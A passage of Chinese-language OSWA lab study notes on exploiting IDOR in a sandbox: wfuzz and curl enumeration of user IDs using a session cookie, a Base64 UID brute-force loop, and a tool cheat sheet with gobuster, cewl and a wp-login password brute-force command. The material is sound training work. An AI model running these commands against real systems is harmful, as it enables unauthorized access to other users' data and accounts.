SELECT * FROM customers WHERE custId = 1;
```
> custId 使用者可控，後端只用 ID 查資料，並沒有檢查這個 custId 是否屬於當前登入使用者

另外常見情景利用  Unique Identifier (UID)。 UID 可以是數字或字母數字組合：\
URL query: `/customerPage/?custId=1`\
更常見：`/user/a8e62d80-42cc-4ac6-bf53-d28a0ff61a82`

ID-Based IDOR 是指在存取資料庫物件時，直接使用使用者可控的識別值（如 ID、UID、UUID）查詢資料，卻未驗證該物件是否屬於當前使用者，導致未授權的資料存取

## Exploiting IDOR in the Sandbox
### Exploiting Static File IDOR
透過 [環境範例]\
變更 URL query: `/docs/?f=1.txt`

### Exploiting ID-Based IDOR
透過 [環境範例]\
變更 URL query: `/customerPage/?custId=1`

### Exploiting More Complex IDOR
[環境範例]\
使用 user Harb 登入後，302 到 `/user/?uid=62718`\
![image](https://hackmd.io/_uploads/H1EpZnZvbx.png)

以下要帶上 Cookie 爆破有效 user (基準透過 response size 判斷)
- 測試直接瀏覽 的 response size
```
┌──(chw💲CHW)-[~/Offsec/OSWA]
└─$ curl -s http://idor-sandbox:80/user/?uid=62718 -w '%{size_download}'
0 
```
- 帶上 Cookie 測試 `錯誤` 的 response size (爆破時排除用)
```
┌──(chw💲CHW)-[~/Offsec/OSWA]
└─$ curl -s /dev/null http://idor-sandbox:80/user/?uid=91191 -w '%{size_download}' --header "Cookie: PHPSESSID=*****586f4bd0da382e13dxxxxxxxxxx"
...
2873
```
> 錯誤 UID 的回應大小: 2873\
> 2873 bytes = 沒資料 / 不存在的 UID

- wfuzz 爆破
可以知道 UID 是五位數: `/usr/share/seclists/Fuzzing/5-digits-00000-99999.txt`
```
┌──(chw💲CHW)-[~/Offsec/OSWA]
└─$ wfuzz -c -z file,/usr/share/seclists/Fuzzing/5-digits-00000-99999.txt --hc 404 --hh 2873 -H  "Cookie: PHPSESSID=*****586f4bd0da382e13dxxxxxxxxxx" http://idor-sandbox/user/?uid=FUZZ

```
![image](https://hackmd.io/_uploads/rkm6v3-D-l.png)

測試：可以成功瀏覽其他 User 資訊\
![image](https://hackmd.io/_uploads/rkViu3ZDZe.png)

透過 Burp 觀察測試：\
可以偽造其他 User subscribe/unsubscribe\
![image](https://hackmd.io/_uploads/H1ZlF2-PWe.png)

- UID 非純數字 (Base64)
[環境範例]\
觀察 URL query: `/challenge/?uid=MQ==`\
MQ==: (Base64decode) 1\
Mg==: (Base64decode) 2 ...\
若要爆破：
1. 使用 wfuzz 並建立 base64 wordlist
Wordlist:
```py
seq 1 200 | while read -r i; do
  printf %s "$i" | base64 | tr -d '\n'
  printf '\n'
done > uid_b64.txt
```
![image](https://hackmd.io/_uploads/Sy8th2WwWl.png)

2. 轉寫腳本 (1 ~ 200)，若找到 flag 則 break
```py
for i in $(seq 1 200); do
  b64=$(printf %s "$i" | base64)
  url="http://idor-sandbox:80/challenge/?uid=$b64"
  echo "[*] $i -> $b64"
  curl -s "$url" | grep -Eo 'OS\{[^}]+\}|flag\{[^}]+\}' && break
done
```
![image](https://hackmd.io/_uploads/Sk_sn2-wZl.png)

# Tools
- Burp Suite
    - Proxy, Intruder, Repeater
- Nmap
    - `/usr/share/nmap/scripts`
    - `--script=http-methods,http-ls,http-robots.txt,http-cookie-flags,http-cors`
- Wordlists
    - SecLists
    - `sudo cewl -d 2 -m 5 -w ourWordlist.txt www.MegaCorpOne.com`
    - `-d` 爬取深度, `-m 5` 不小於 5 個字元
- Gobuster
    - `gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -t 5 -b 301`
    - `gobuster dns -d megacorpone.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 30`
- Wfuzz
    - File:\
    `wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 301,404,403 http://offsecwp:80/FUZZ/`
    - Path:\
    `wfuzz -c -zfile,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404,403,301 http://offsecwp:80/FUZZ`
    - Parameter:\
    `wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404,301 http://offsecwp:80/index.php?FUZZ=data`
    - Parameter Values:\
    `wfuzz -c -z file,/usr/share/seclists/Usernames/cirt-default-usernames.txt --hc 404 http://offsecwp:80/index.php?fpv=FUZZ`
    - POST Data:\
    `wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404 -d "log=admin&pwd=FUZZ" http://offsecwp:80/wp-login.php`\
- Hakrawler: spidering tool
    - `echo "https://chw41.github.io/" | hakrawler -u `
- Shells

    
